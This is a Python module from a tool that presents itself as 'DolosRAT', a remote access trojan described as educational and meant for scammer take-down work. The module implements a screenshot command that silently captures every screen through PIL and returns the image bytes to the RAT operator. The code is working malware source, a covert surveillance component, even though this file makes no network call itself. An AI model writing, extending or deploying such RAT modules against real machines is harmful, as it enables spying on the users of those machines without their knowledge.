# !/usr/bin/env python
# -*- coding: utf-8 -*-
#----------------------------------------------------------------------------
# Creator : Ryan I.
# Created Date: 20/07/2023
# version ='1.0'
# ---------------------------------------------------------------------------
"""
DolosRAT provides a GUI-based RAT client and server, purposed for demonstrating
techniques frequently used within scammer take-down operations. Please note that
the use of this tool is for educational purposes only.
"""

# Built-in/Generic Imports.
from builtins import getattr
from io import BytesIO
from importlib import import_module

from typing import Any, Union, List
# from os import getcwd, path as os_path
# from sys import path as sys_path

# Modules.
# from .command import Command
# sys.path.append('/commands/')

class ScreenshotCommand():
    """_summary_

    Args:
        Command (_type_): _description_
    """

    def __init__(self: object) -> None:
        """_summary_

        Args:
            self (object): _description_

        Returns:
            Any: _description_
        """

        # Initialise from Command parent.
        # super().__init__()
        
        self._mods: List[Any] = []

        # Create list of imported dependencies.
        self.create_deps('PIL.ImageGrab')
        
    def get_dep(self: object, mod_name: str) -> Union[Any, None]:
        """_summary_

        Args:
            self (object): _description_
            mod_name (str): _description_

        Returns:
            bool: _description_
        """

        for idx, dep in enumerate(self._mods):
            if dep.__name__ == mod_name:
                return self._mods[idx]

        return None

    def create_deps(self: object, *mods: List[str]) -> None:
        """_summary_

        Args:
            self (object): _description_
        """

        try:
            for mod in mods:
                self._mods.append(import_module(mod))
        except ModuleNotFoundError:
            pass

    def execute(self: object) -> bytes:
        """_summary_

        Args:
            self (object): _description_

        Returns:
            Any: _description_
        """

        # Create bytearray to store bytes for
        # screen capture.
        img_bytes = BytesIO()

        # Create image capture, in PNG format.
        img_capture = getattr(self.get_dep('PIL.ImageGrab'),'grab')(all_screens=True)
        img_capture.save(img_bytes, 'PNG')

        # Return bytes in byte array.
        return img_bytes.getvalue()
